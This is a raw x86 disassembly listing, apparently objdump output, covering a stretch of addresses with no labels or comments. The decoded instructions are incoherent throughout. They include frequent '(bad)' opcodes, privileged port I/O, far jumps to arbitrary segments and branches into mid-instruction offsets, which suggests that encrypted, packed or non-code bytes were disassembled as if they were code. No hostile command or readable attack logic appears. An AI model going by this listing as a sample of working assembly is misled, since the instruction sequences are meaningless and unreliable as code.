  405286:	mov    dl,0xc
  405288:	test   eax,0xdb3a4a86
  40528d:	cmpxchg cl,bh
  405290:	mov    eax,ds:0x436fd5a8
  405295:	mov    BYTE PTR [eax-0x497e7442],dl
  40529b:	adc    BYTE PTR [ebp-0x3b],bh
  40529e:	into   
  40529f:	cwde   
  4052a0:	loop   0x405246
  4052a2:	jecxz  0x4052f4
  4052a4:	sbb    bh,BYTE PTR [ebx-0x32]
  4052a7:	leave  
  4052a8:	leave  
  4052a9:	repz xchg esi,eax
  4052ab:	adc    bh,BYTE PTR [eax]
  4052ad:	mov    edx,DWORD PTR [ebx-0x1c]
  4052b0:	jb     0x405253
  4052b2:	mov    edx,0x9581da2e
  4052b7:	xlat   BYTE PTR ds:[ebx]
  4052b8:	add    ecx,DWORD PTR [eax]
  4052ba:	outs   dx,DWORD PTR ds:[esi]
  4052bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052bc:	jmp    0xf15e56d5
  4052c1:	fnstsw WORD PTR [ebx+0x28313ec0]
  4052c7:	xor    eax,DWORD PTR [ebp+esi*2+0x77]
  4052cb:	lahf   
  4052cc:	pop    esi
  4052cd:	xchg   DWORD PTR [edi+0xa0addba],edx
  4052d3:	sahf   
  4052d4:	jb     0x4052eb
  4052d6:	push   es
  4052d7:	out    dx,al
  4052d8:	pop    ecx
  4052d9:	leave  
  4052da:	std    
  4052db:	xor    eax,0xcab4549f
  4052e0:	xchg   DWORD PTR [edx],ecx
  4052e2:	xor    BYTE PTR [ecx-0x541eb2e2],dh
  4052e8:	test   BYTE PTR [esp+ebp*1],dh
  4052eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ec:	xchg   ebx,eax
  4052ed:	mov    cl,0x40
  4052ef:	cld    
  4052f0:	test   al,0x6c
  4052f2:	fdivr  DWORD PTR [ebp+0x2d]
  4052f5:	adc    DWORD PTR [ebx+0x5e3815a1],esp
  4052fb:	xor    eax,DWORD PTR [ebp-0x21230a25]
  405301:	leave  
  405302:	mov    esi,0x6debd6bc
  405307:	int3   
  405308:	cs nop
  40530a:	ficom  DWORD PTR [ebp-0x433edd65]
  405310:	cmp    DWORD PTR [ebp+0x1c],ebx
  405313:	push   esp
  405314:	pop    edi
  405315:	icebp  
  405316:	call   0x9009:0xf6d35e4a
  40531d:	sub    esp,ebx
  40531f:	jae    0x40533a
  405321:	js     0x405370
  405323:	icebp  
  405324:	inc    edx
  405325:	pop    ecx
  405326:	pusha  
  405327:	nop
  405328:	mov    ah,ah
  40532a:	ins    BYTE PTR es:[edi],dx
  40532b:	pop    eax
  40532c:	clc    
  40532d:	push   ss
  40532e:	add    bl,BYTE PTR [edi]
  405330:	or     eax,0x63b09f89
  405335:	push   cs
  405336:	sahf   
  405337:	mov    bl,BYTE PTR [ebx]
  405339:	mov    eax,ds:0x4d6996e9
  40533e:	jne    0x40536b
  405340:	dec    DWORD PTR [eax-0x670db191]
  405346:	mov    eax,0xdefba05d
  40534b:	cmp    DWORD PTR [eax-0x33],esp
  40534e:	adc    eax,0xb0028bae
  405353:	push   ecx
  405354:	mov    ah,0xf8
  405356:	push   es
  405357:	and    BYTE PTR [ebx+esi*2+0x6f],0x63
  40535c:	push   edi
  40535d:	and    al,0x63
  40535f:	mov    edi,0x128612a3
  405364:	mov    esi,0xd5946330
  405369:	mov    ch,al
  40536b:	clc    
  40536c:	xchg   edx,eax
  40536d:	xor    cl,BYTE PTR [esi-0x6e]
  405370:	mov    edx,0x1afeb98b
  405375:	mov    cl,BYTE PTR [edx-0x75]
  405378:	repnz sar BYTE PTR [eax+0x6ad42a0d],0x9f
  405380:	adc    al,0x2
  405382:	pop    ecx
  405383:	repz sub al,0x6e
  405386:	test   esi,edi
  405388:	xchg   DWORD PTR [ecx+0x62198b9c],ebx
  40538e:	popf   
  40538f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405390:	fisttp DWORD PTR [ebx+0x2c]
  405393:	jp     0x4053b9
  405395:	sbb    al,ch
  405397:	push   edx
  405398:	leave  
  405399:	push   edi
  40539a:	xor    ebx,0x48
  40539d:	xchg   edx,eax
  40539e:	(bad)  
  40539f:	aam    0x70
  4053a1:	loop   0x4053a2
  4053a3:	cmp    al,0x55
  4053a5:	push   0x723014cb
  4053aa:	dec    ebx
  4053ab:	mov    bh,0x8b
  4053ad:	js     0x4053e5
  4053af:	or     eax,0x68d7eb8d
  4053b4:	jnp    0x405372
  4053b6:	(bad)  
  4053b7:	shl    BYTE PTR [edx+0x24426214],0x6a
  4053be:	cmp    dh,BYTE PTR [ebp+0x57a1300e]
  4053c4:	push   ebx
  4053c5:	mov    ebx,0x1c87718a
  4053ca:	cmp    ah,bh
  4053cc:	adc    DWORD PTR [ebx-0x79],edi
  4053cf:	xchg   edx,eax
  4053d0:	or     esi,eax
  4053d2:	adc    esi,DWORD PTR [eax-0x50]
  4053d5:	and    al,BYTE PTR [eax]
  4053d7:	loopne 0x405429
  4053d9:	test   BYTE PTR [ecx+0x9],bh
  4053dc:	bound  esi,QWORD PTR [esi]
  4053de:	test   cl,0x55
  4053e1:	xor    eax,0x56ad0c8c
  4053e6:	and    DWORD PTR [edi],ebp
  4053e8:	lock sub al,cl
  4053eb:	je     0x4053b6
  4053ed:	mov    ds:0x62defd35,eax
  4053f2:	mov    edx,0x88091683
  4053f7:	fidivr WORD PTR [edx-0x5f3841a1]
  4053fd:	adc    DWORD PTR [ebx-0x1a],esi
  405400:	(bad)  
  405401:	or     esp,ecx
  405403:	sbb    BYTE PTR [edx-0x1027d0b9],0x7c
  40540a:	gs (bad) 
  40540c:	adc    eax,0xce79d32a
  405411:	test   al,0xb4
  405413:	icebp  
  405414:	aam    0xc8
  405416:	(bad)  
  405418:	mov    edx,0x202183ed
  40541d:	repz mov ds:0xcd0754e,al
  405423:	xor    ebp,ecx
  405425:	lds    edi,FWORD PTR [edx-0x3e]
  405428:	in     eax,0x96
  40542a:	mov    ebx,0x8155bb4f
  40542f:	nop
  405430:	mov    al,ds:0x4266b1f8
  405435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405436:	in     al,dx
  405437:	inc    ecx
  405438:	loop   0x405470
  40543a:	xchg   ebx,eax
  40543b:	hlt    
  40543c:	mov    ch,BYTE PTR [ecx+ecx*4]
  40543f:	mov    eax,0xb59a9aa7
  405444:	or     eax,0xb8ef7c27
  405449:	cmp    DWORD PTR [ecx+ecx*8-0x19daead],0x1e7341dc
  405454:	fiadd  DWORD PTR [ecx+ecx*8]
  405457:	fist   WORD PTR [ebx+esi*2]
  40545a:	cmp    edi,eax
  40545c:	out    0xbb,eax
  40545e:	ror    al,1
  405460:	out    0x1b,al
  405462:	push   ebx
  405463:	repnz in al,0x3
  405466:	xor    BYTE PTR [ebp+0x23d2e8d7],bl
  40546c:	mov    ch,0xc4
  40546e:	push   edx
  40546f:	stos   BYTE PTR es:[edi],al
  405470:	cmp    bl,BYTE PTR [esi-0x2d]
  405473:	push   ds
  405474:	add    edx,ecx
  405476:	dec    eax
  405477:	cmp    eax,0x3b2540c
  40547c:	mov    ds:0x551ec2db,al
  405481:	rcl    edi,0xad
  405484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405485:	inc    edi
  405486:	iret   
  405487:	push   es
  405488:	jno    0x40544e
  40548a:	mov    ds:0x43602b56,eax
  40548f:	xchg   DWORD PTR ds:0x6187d574,edi
  405495:	mov    ch,0xc7
  405497:	pop    ebp
  405498:	and    al,BYTE PTR [ebx+0x53]
  40549b:	jp     0x40545b
  40549d:	stc    
  40549e:	sbb    al,0x5d
  4054a0:	dec    esp
  4054a1:	stc    
  4054a2:	test   cl,dl
  4054a4:	xor    esp,DWORD PTR [eax-0x16a0d053]
  4054aa:	imul   esi,DWORD PTR [ecx+0x13c394a5],0x3213735d
  4054b4:	lea    esp,[edi-0x11]
  4054b7:	daa    
  4054b8:	or     ebx,ecx
  4054ba:	or     ecx,DWORD PTR [eax+0x59]
  4054bd:	sub    al,0x0
  4054bf:	das    
  4054c0:	cmp    dh,BYTE PTR [eax-0x168fc413]
  4054c6:	mov    BYTE PTR [ebx],ah
  4054c8:	mov    esi,0x89bf3207
  4054cd:	xchg   DWORD PTR [edx-0x14fa8ace],ebp
  4054d3:	xchg   ecx,eax
  4054d4:	ins    BYTE PTR es:[edi],dx
  4054d5:	cld    
  4054d6:	sbb    esi,DWORD PTR [esi-0x5cb277ff]
  4054dc:	mov    ebp,0x4d241a37
  4054e1:	arpl   WORD PTR [edx+0x2955ec6f],dx
  4054e7:	aaa    
  4054e8:	jecxz  0x405504
  4054ea:	jl     0x405503
  4054ec:	xchg   BYTE PTR [esi+0x131ec497],dl
  4054f2:	xchg   edx,eax
  4054f3:	sbb    al,0xbc
  4054f5:	sbb    eax,0xe69c046a
  4054fa:	call   0x130dee5b
  4054ff:	hlt    
  405500:	sub    eax,0x8572adc1
  405505:	mov    edi,DWORD PTR [eax+0x1a]
  405508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405509:	mov    bl,0x81
  40550b:	push   0xffffffc0
  40550d:	pop    ss
  40550e:	xchg   edi,eax
  40550f:	add    BYTE PTR [edi],ah
  405511:	fdivp  st(4),st
  405513:	ret    0x1c1d
  405516:	xchg   DWORD PTR [esp+ebp*1],eax
  405519:	lahf   
  40551a:	shl    DWORD PTR [eax+0x1f],cl
  40551d:	ret    0x89b8
  405520:	dec    ebx
  405521:	cmp    BYTE PTR [edi-0x33],cl
  405524:	adc    ebp,edx
  405526:	xchg   esp,eax
  405527:	xchg   ebx,eax
  405528:	pop    eax
  405529:	(bad)  
  40552b:	stc    
  40552c:	xchg   BYTE PTR [esi-0x1dade25d],cl
  405532:	in     eax,dx
  405533:	int    0xb
  405535:	imul   edx,eax,0xffffffdd
  405538:	dec    ecx
  405539:	pop    ecx
  40553a:	sub    DWORD PTR [ebp+0x66],esp
  40553d:	jge    0x4054f2
  40553f:	xor    BYTE PTR [ebp+esi*4-0x27a8f56],0x37
  405547:	xchg   esi,eax
  405548:	jl     0x40554e
  40554a:	pop    ds
  40554b:	es test al,0x96
  40554e:	push   es
  40554f:	pop    ebp
  405550:	inc    ecx
  405551:	jmp    0x405531
  405553:	aaa    
  405554:	lea    ecx,[edx+0x64]
  405557:	imul   ebp,DWORD PTR [ebp+esi*4+0x3c],0xb8d65205
  40555f:	push   eax
  405560:	ds icebp 
  405562:	repz loope 0x405577
  405565:	mov    ds:0xf79a6478,eax
  40556a:	bound  esp,QWORD PTR [ebp-0x73]
  40556d:	jmp    0x4055b9
  40556f:	stos   DWORD PTR es:[edi],eax
  405570:	(bad)
  405574:	adc    al,BYTE PTR [edx+0x5d]
  405577:	fcmovnbe st,st(3)
  405579:	shl    DWORD PTR [edi+0x1f],1
  40557c:	cmc    
  40557d:	in     eax,0x3e
  40557f:	imul   eax,DWORD PTR [edx+0x6c7051b6],0x7e
  405586:	pusha  
  405587:	lods   al,BYTE PTR ds:[esi]
  405588:	imul   ebx,DWORD PTR [ebp-0x443afb1f],0x11
  40558f:	fmul   QWORD PTR [eax-0x161985d5]
  405595:	mov    ebx,0x894691df
  40559a:	and    al,0x64
  40559c:	int    0x1
  40559e:	pop    eax
  40559f:	mov    al,0xb1
  4055a1:	cmp    BYTE PTR [ebx+edx*1],al
  4055a4:	stos   DWORD PTR es:[edi],eax
  4055a5:	xlat   BYTE PTR ds:[ebx]
  4055a6:	xchg   edi,eax
  4055a7:	cmp    DWORD PTR [esi+0x7c],edi
  4055aa:	inc    ebx
  4055ab:	pop    eax
  4055ac:	daa    
  4055ad:	hlt    
  4055ae:	cmp    bl,0x90
  4055b1:	push   es
  4055b2:	adc    edx,DWORD PTR [edx-0x1b3e6692]
  4055b8:	add    ecx,ebp
  4055ba:	mov    bh,0xf4
  4055bc:	xchg   esi,eax
  4055bd:	dec    ecx
  4055be:	aam    0x19
  4055c0:	dec    edx
  4055c1:	pop    esp
  4055c2:	jne    0x4055b4
  4055c4:	jno    0x40555f
  4055c6:	int    0x18
  4055c8:	sar    bh,1
  4055ca:	pop    ecx
  4055cb:	mov    esp,0x410d9605
  4055d0:	loopne 0x405641
  4055d2:	ret    
  4055d3:	and    DWORD PTR [ebx-0x3a],ebp
  4055d6:	sbb    bh,BYTE PTR ds:0xad5e9689
  4055dc:	adc    dh,0xcb
  4055df:	cmp    al,0xf0
  4055e1:	push   0xefabe096
  4055e6:	or     DWORD PTR [edx+0xe933627],esp
  4055ec:	dec    edx
  4055ed:	(bad)  
  4055ee:	jl     0x4055f3
  4055f0:	xchg   edi,eax
  4055f1:	xchg   esp,eax
  4055f2:	pcmpgtb mm2,QWORD PTR [esi-0x13]
  4055f6:	adc    dl,bl
  4055f8:	jo     0x4055cc
  4055fa:	jl     0x405642
  4055fc:	mov    dl,0x17
  4055fe:	sub    eax,0xc35da65a
  405603:	xchg   esp,eax
  405604:	push   esp
  405605:	lahf   
  405606:	call   0x30722788
  40560b:	push   esi
  40560c:	f2xm1  
  40560e:	jmp    0x4055a4
  405610:	xchg   ebx,eax
  405611:	scas   al,BYTE PTR es:[edi]
  405612:	dec    edx
  405613:	gs aad 0xfa
  405616:	fs jns 0x4055f0
  405619:	rol    DWORD PTR [esi-0x6d],1
  40561c:	push   0xffffff8a
  40561e:	dec    DWORD PTR [eax-0x16]
  405621:	div    DWORD PTR [esi+eiz*8-0xf]
  405625:	test   BYTE PTR [ecx-0x59],cl
  405628:	mov    DWORD PTR [ebx+0x18b5c6b1],edx
  40562e:	dec    edi
  40562f:	xchg   edx,esp
  405631:	fnstcw WORD PTR [edx-0x2f863463]
  405637:	dec    eax
  405638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405639:	and    BYTE PTR [ebx-0xa],al
  40563c:	jge    0x4055c5
  40563e:	popf   
  40563f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405641:	or     ebp,ebp
  405643:	addr16 pop esp
  405645:	(bad)  
  405646:	mov    DWORD PTR [ebp+0x78],ebx
  405649:	pop    ecx
  40564a:	fsub   st,st(6)
  40564c:	(bad)  
  40564d:	cmp    al,0xe7
  40564f:	pusha  
  405650:	mov    bl,0x80
  405652:	mov    cs,WORD PTR [edx-0x37]
  405655:	or     BYTE PTR [esp+eax*8-0x29869dbc],ah
  40565c:	xor    eax,0x39261895
  405661:	(bad)  [eax+ebx*1]
  405664:	push   edx
  405665:	push   esp
  405666:	push   edx
  405667:	dec    esp
  405668:	xor    ecx,esi
  40566a:	outs   dx,DWORD PTR ds:[esi]
  40566b:	mov    al,ds:0xaf9aecf9
  405670:	jo     0x405626
  405672:	push   ebx
  405673:	jmp    0x40564f
  405675:	mul    ebp
  405677:	gs inc ebx
  405679:	sub    bh,BYTE PTR ds:0x43533513
  40567f:	nop
  405680:	out    dx,eax
  405681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405682:	push   ecx
  405683:	cmp    ebx,DWORD PTR [edi-0x4b668691]
  405689:	or     DWORD PTR [esi],esi
  40568b:	sub    BYTE PTR [ebp-0x7f],dh
  40568e:	jmp    0xaab2:0x96aec9e7
  405695:	hlt    
  405696:	dec    eax
  405697:	int    0x8c
  405699:	int3   
  40569a:	cld    
  40569b:	xchg   edx,eax
  40569c:	add    al,0x38
  40569e:	jp     0x405668
  4056a0:	shl    DWORD PTR [edx+0x5b],1
  4056a3:	dec    edx
  4056a4:	test   BYTE PTR [eax],bh
  4056a6:	pop    edx
  4056a7:	in     eax,0x24
  4056a9:	pushf  
  4056aa:	sti    
  4056ab:	jns    0x4056f4
  4056ad:	xchg   ebx,eax
  4056ae:	aam    0x60
  4056b0:	mov    ebx,DWORD PTR ds:0x408056d8
  4056b6:	xor    DWORD PTR [ebx],edi
  4056b8:	jo     0x405737
  4056ba:	add    eax,0xf811b375
  4056bf:	shl    DWORD PTR [ecx-0x2b8745cd],1
  4056c5:	int3   
  4056c6:	sbb    al,0x37
  4056c8:	popf   
  4056c9:	arpl   WORD PTR [ecx-0x6a],sp
  4056cc:	dec    ecx
  4056cd:	rol    BYTE PTR [eax],0xee
  4056d0:	xchg   esi,eax
  4056d1:	push   ebx
  4056d2:	jns    0x40570a
  4056d4:	and    eax,0xf8664993
  4056d9:	jne    0x405706
  4056db:	or     DWORD PTR ds:0x7ef1e3c6,0x6c
  4056e2:	imul   ebp,DWORD PTR [edi+0x3401d526],0x6200ba02
  4056ec:	das    
  4056ed:	rcr    DWORD PTR [edi+0x32985b0e],cl
  4056f3:	push   edi
  4056f4:	mov    ecx,0x84de7e48
  4056f9:	aaa    
  4056fa:	in     al,dx
  4056fb:	xor    bl,ah
  4056fd:	cdq    
  4056fe:	xchg   edi,eax
  4056ff:	das    
  405700:	add    ebx,DWORD PTR ds:0xcb19b4f0
  405706:	or     al,0xff
  405708:	push   esp
  405709:	enter  0xf985,0x43
  40570d:	add    DWORD PTR ds:0xb6b94f58,esp
  405713:	jns    0x405743
  405715:	out    dx,al
  405716:	loop   0x405763
  405718:	scas   eax,DWORD PTR es:[edi]
  405719:	xor    esp,DWORD PTR [ebx]
  40571b:	dec    ebx
  40571c:	mov    edx,0xf06c418f
  405721:	pop    edi
  405722:	jno    0x405766
  405724:	sbb    esp,esp
  405726:	aaa    
  405727:	xchg   ecx,eax
  405728:	mov    dl,dl
  40572a:	out    0xc4,eax
  40572c:	and    eax,0x1b8b6196
  405731:	mov    dl,0x6f
  405733:	jne    0x405712
  405735:	add    ebp,DWORD PTR [ecx+0x2b]
  405738:	mov    cl,0x8b
  40573a:	pop    ss
  40573b:	inc    esi
  40573c:	popf   
  40573d:	jnp    0x40571b
  40573f:	popa   
  405740:	cmp    eax,0x3c59522f
  405745:	loope  0x4056e5
  405747:	mov    ch,0xef
  405749:	imul   esi,DWORD PTR [ebx],0x5d37815e
  40574f:	popf   
  405750:	sub    DWORD PTR [esi],ebx
  405752:	(bad)  
  405753:	lea    ecx,[esi+0x20cfd8f8]
  405759:	out    dx,al
  40575a:	xor    ebp,edi
  40575c:	cmp    eax,0x1ca63d06
  405761:	pop    esi
  405762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405763:	push   edx
  405764:	xlat   BYTE PTR ds:[ebx]
  405765:	mov    eax,0xae249f0
  40576a:	or     DWORD PTR [ecx+esi*8+0x78],eax
  40576e:	sbb    eax,0xcd47e3b1
  405773:	or     eax,0x8732c17c
  405778:	cs cmp bh,bh
  40577b:	xlat   BYTE PTR ds:[ebx]
  40577c:	mov    esp,0x9a89a830
  405781:	and    BYTE PTR [eax+eiz*4],0xe
  405785:	es push edi
  405787:	(bad)  
  405788:	dec    eax
  405789:	and    ebp,DWORD PTR [edx+0xf]
  40578c:	test   esp,eax
  40578e:	or     al,0xc8
  405790:	xchg   si,ax
  405792:	push   0xa35e873f
  405797:	in     eax,dx
  405798:	xor    DWORD PTR ds:0x3176d776,0x53
  40579f:	iret   
  4057a0:	test   DWORD PTR [ecx+0x5d],ebp
  4057a3:	push   0xffffffe2
  4057a5:	(bad)
  4057a8:	daa    
  4057a9:	jo     0x40572e
  4057ab:	add    DWORD PTR [esi-0x5ce725e7],edi
  4057b1:	and    DWORD PTR ds:0xb25a60bd,ecx
  4057b7:	mov    WORD PTR [ecx+0x1932a83d],?
  4057bd:	call   0x851e818f
  4057c2:	loopne 0x4057e8
  4057c4:	adc    eax,0xfbba6973
  4057c9:	mov    ds:0x6d83ef0d,al
  4057ce:	imul   edi,DWORD PTR [eax],0xe4832926
  4057d4:	sub    DWORD PTR [edx+0x26a119d5],ebx
  4057da:	inc    esp
  4057db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057dc:	cmp    ch,al
  4057de:	dec    edx
  4057df:	inc    ebx
  4057e0:	mov    ch,0x17
  4057e2:	mov    dh,0xb8
  4057e4:	(bad)  
  4057e5:	lock xchg esp,eax
  4057e7:	xchg   BYTE PTR [ebx-0x3b],bh
  4057ea:	fld    TBYTE PTR [ecx+ebp*1+0x59ab2b25]
  4057f1:	ds das 
  4057f3:	jmp    0x61fd:0x5bde941c
  4057fa:	pushf  
  4057fb:	push   edx
  4057fc:	and    al,0xdd
  4057fe:	iret   
  4057ff:	xor    ch,al
  405801:	mov    edi,0xdffea47e
  405806:	cs stos BYTE PTR es:[edi],al
  405808:	inc    esp
  405809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40580a:	test   al,0xb8
  40580c:	mov    ds:0x394f48c5,al
  405811:	add    al,0xc9
  405813:	fist   DWORD PTR [edi-0x5d82e3ab]
  405819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40581a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40581b:	lea    esi,[eax+0xe184596]
  405821:	mov    edi,0x216178a9
  405826:	push   ebx
  405827:	prefetch BYTE PTR [edx+0xc]
  40582b:	lods   al,BYTE PTR fs:[esi]
  40582d:	mov    ds:0x9b11b3d4,eax
  405832:	add    ecx,DWORD PTR [ebp+0x22]
  405835:	sbb    bh,BYTE PTR [esi+0x7c1f6102]
  40583b:	arpl   WORD PTR [edx],dx
  40583d:	dec    edi
  40583e:	ins    BYTE PTR es:[edi],dx
  40583f:	in     al,dx
  405840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405841:	test   DWORD PTR [edx+0x47960b07],esi
  405847:	inc    eax
  405848:	jne    0x40586b
  40584a:	pop    ecx
  40584b:	fnstenv [edx]
  40584d:	test   eax,0x85358866
  405852:	mov    dh,0x27
  405854:	lahf   
  405855:	dec    ebx
  405856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405857:	retf   0x2e61
  40585a:	inc    ebx
  40585b:	xor    dh,BYTE PTR [edi-0x12]
  40585e:	je     0x405820
  405860:	pop    ds
  405861:	retf   
  405862:	cmp    eax,0xada124ea
  405867:	mov    ds:0x808212d2,eax
  40586c:	test   al,0x14
  40586e:	pop    es
  40586f:	inc    BYTE PTR [ebp+0x329153a7]
  405875:	test   al,0xbf
  405877:	and    eax,0x7e627a28
  40587c:	xchg   DWORD PTR ds:0x741d5d56,ecx
  405882:	xchg   BYTE PTR [ebp+ebp*1-0x25],ch
  405886:	fild   WORD PTR [ebp+ebx*4+0x7d]
  40588a:	cld    
  40588b:	xor    al,0x9c
  40588d:	mov    BYTE PTR [edi-0x64],0xa4
  405891:	cmp    eax,0xc64afd96
  405896:	rcl    esi,cl
  405898:	mov    edi,esi
  40589a:	(bad)  
  40589b:	xchg   ebx,eax
  40589c:	call   0x68defc1b
  4058a1:	pop    eax
  4058a2:	retf   0x25d
  4058a5:	sub    bl,BYTE PTR [edx]
  4058a7:	mov    eax,ds:0x94b3545c
  4058ac:	into   
  4058ad:	push   0xffffffa5
  4058af:	int3   
  4058b0:	adc    ch,BYTE PTR fs:[edi-0x10061e8c]
  4058b7:	inc    esp
  4058b8:	cmc    
  4058b9:	cmp    al,0xc6
  4058bb:	add    eax,0xcba1db81
  4058c0:	les    esi,FWORD PTR [esi+eax*4+0x63263780]
  4058c7:	sub    al,0x4c
  4058c9:	lods   al,BYTE PTR ds:[esi]
  4058ca:	fwait
  4058cb:	repz inc ebx
  4058cd:	add    BYTE PTR [ebx],dl
  4058cf:	push   ss
  4058d0:	mov    edx,0x243aa1c2
  4058d5:	test   eax,0xad169e21
  4058da:	inc    esp
  4058db:	adc    eax,0x46e8b812
  4058e0:	mov    ebx,0x8bf63d92
  4058e5:	test   BYTE PTR [edx+0x51cae80f],ah
  4058eb:	cmp    eax,0x2195eb5a
  4058f0:	(bad)  
  4058f1:	ds xchg ecx,eax
  4058f3:	dec    ecx
  4058f4:	test   al,0xbd
  4058f6:	clc    
  4058f7:	fwait
  4058f8:	test   DWORD PTR [ebx],ecx
  4058fa:	inc    edi
  4058fb:	stc    
  4058fc:	pop    edx
  4058fd:	(bad)  
  4058fe:	in     al,dx
  4058ff:	into   
  405900:	xlat   BYTE PTR ds:[ebx]
  405901:	out    dx,eax
  405902:	mov    al,0xea
  405904:	push   cs
  405905:	leave  
  405906:	mov    dh,0x70
  405908:	dec    DWORD PTR [ebp+0x30a160]
  40590e:	add    ebp,eax
  405910:	sahf   
  405911:	imul   esi,edx,0x17
  405914:	push   eax
  405915:	and    BYTE PTR [esi+0x492c2231],dh
  40591b:	ja     0x4058df
  40591d:	addr16 aaa 
  40591f:	jg     0x4058cb
  405921:	jb     0x40591a
  405923:	jge    0x4058a5
  405925:	scas   eax,DWORD PTR es:[edi]
  405926:	mov    WORD PTR [esi],?
  405928:	retf   
  405929:	imul   esi,DWORD PTR [ebx+0x23],0x37bd99eb
  405930:	dec    edi
  405931:	sbb    al,0x6d
  405933:	stos   BYTE PTR es:[edi],al
  405934:	retf   
  405935:	(bad)  
  405936:	mov    ds:0x1c0ddc71,eax
  40593b:	dec    ecx
  40593d:	mov    ds:0xa7cbf863,eax
  405942:	add    DWORD PTR [ecx-0x6],0xffffffc3
  405946:	es sub ah,bl
  405949:	in     al,dx
  40594a:	mov    dh,BYTE PTR [edx+0x212c046f]
  405950:	push   ecx
  405951:	daa    
  405952:	icebp  
  405953:	call   0x2304:0x1b286afe
  40595a:	and    al,0x5b
  40595c:	loopne 0x405921
  40595e:	(bad)  
  405960:	jmp    0xb9738aa8
  405965:	int3   
  405966:	test   eax,0x314e7a0b
  40596b:	mov    bl,0x5f
  40596d:	adc    ebx,0xe409b603
  405973:	rcl    bl,cl
  405975:	mov    ecx,0xb8526b0c
  40597a:	scas   eax,DWORD PTR es:[edi]
  40597b:	(bad)  
  40597c:	pop    esi
  40597d:	xchg   ecx,eax
  40597e:	inc    ecx
  40597f:	icebp  
  405980:	jle    0x405920
  405982:	sbb    DWORD PTR [eax-0x28],esp
  405985:	push   esp
  405986:	mov    bh,0xd6
  405988:	leave  
  405989:	pop    esp
  40598a:	sbb    DWORD PTR [eax-0x52],0x7614cb21
  405991:	and    eax,0x9bab9dac
  405996:	jo     0x405934
  405998:	rcl    BYTE PTR [ecx+eax*8],1
  40599b:	xor    BYTE PTR [edi],ch
  40599d:	mov    dl,0xde
  40599f:	jge    0x4059ae
  4059a1:	enter  0xcb07,0xa2
  4059a5:	and    al,0x8d
  4059a7:	add    DWORD PTR [ebp-0x13],ebx
  4059aa:	mov    al,0x54
  4059ac:	scas   eax,DWORD PTR es:[edi]
  4059ad:	cwde   
  4059ae:	inc    ecx
  4059af:	je     0x4059d9
  4059b1:	cdq    
  4059b2:	or     al,0xab
  4059b4:	xchg   BYTE PTR [edx-0xb6339f9],bl
  4059ba:	(bad)  [ebx]
  4059bc:	(bad)  [eax+0x320b6547]
  4059c2:	jnp    0x405a08
  4059c4:	xchg   edx,eax
  4059c5:	inc    eax
  4059c6:	add    eax,0x66b05e9f
  4059cb:	cmp    dh,bl
  4059cd:	bound  esi,QWORD PTR [edi-0x3f9b2dd3]
  4059d3:	mov    ah,0x29
  4059d5:	mov    ds:0x3784d8e9,eax
  4059da:	xchg   edi,eax
  4059db:	xor    ecx,DWORD PTR [eax+0x15]
  4059de:	mov    ebx,esi
  4059e0:	inc    edx
  4059e1:	les    ebx,FWORD PTR [esp+ebp*4+0x11e207c7]
  4059e8:	push   cs
  4059e9:	pop    esp
  4059ea:	sar    BYTE PTR [ecx],cl
  4059ec:	fnsave [ecx+0x66]
  4059ef:	push   es
  4059f0:	loope  0x405a58
  4059f2:	lods   eax,DWORD PTR ds:[esi]
  4059f3:	arpl   si,si
  4059f5:	fadd   DWORD PTR [eax]
  4059f7:	push   ss
  4059f8:	mov    al,0x64
  4059fa:	shl    DWORD PTR [ecx],cl
  4059fc:	loopne 0x405984
  4059fe:	test   DWORD PTR [esp+esi*4-0x50],ecx
  405a02:	dec    esi
  405a03:	pop    esi
  405a04:	jnp    0x4059a4
  405a06:	push   ss
  405a07:	ja     0x4059e7
  405a09:	in     al,dx
  405a0a:	dec    esp
  405a0b:	arpl   WORD PTR [ecx],si
  405a0d:	clc    
  405a0e:	inc    esp
  405a0f:	stos   BYTE PTR es:[edi],al
  405a10:	aas    
  405a11:	inc    esp
  405a12:	inc    ebp
  405a13:	(bad)  
  405a14:	jecxz  0x40599d
  405a16:	and    al,0x58
  405a18:	pop    esp
  405a19:	xchg   BYTE PTR [eax],bh
  405a1b:	(bad)  
  405a1c:	int    0x26
  405a1e:	pop    esp
  405a1f:	mov    ecx,0xde374365
  405a24:	test   eax,0x1c3890ec
  405a29:	or     eax,0x7c9e6cf0
  405a2e:	arpl   WORD PTR [ebx+esi*1-0x6f],cx
  405a32:	mov    esi,0x96f619c
  405a37:	popf   
  405a38:	inc    eax
  405a39:	fcomi  st,st(6)
  405a3b:	and    eax,0xb9c57c5f
  405a40:	mov    ds:0xf1414182,al
  405a45:	ds jmp 0x405a30
  405a48:	mov    bl,0xf0
  405a4b:	es das 
  405a4d:	xchg   BYTE PTR [esi-0x74c914b],ah
  405a53:	pop    ebp
  405a54:	(bad)  
  405a55:	mov    ecx,0x298edb69
  405a5a:	sub    eax,0xfcf75c31
  405a5f:	mov    ds:0x7bfdc342,al
  405a64:	int3   
  405a65:	in     al,dx
  405a66:	enter  0xee15,0x98
  405a6a:	push   edi
  405a6b:	adc    DWORD PTR [ebx],ebp
  405a6d:	inc    ebx
  405a6e:	mov    WORD PTR [eax+0x3934889e],ds
  405a74:	mov    bl,0xb2
  405a76:	inc    edx
  405a77:	push   ds
  405a78:	nop
  405a79:	inc    eax
  405a7a:	inc    eax
  405a7b:	adc    edx,DWORD PTR [esi+0x6f]
  405a7e:	cld    
  405a7f:	mov    al,ds:0xd28b57c9
  405a84:	and    BYTE PTR [ebx+edi*2-0x52],ah
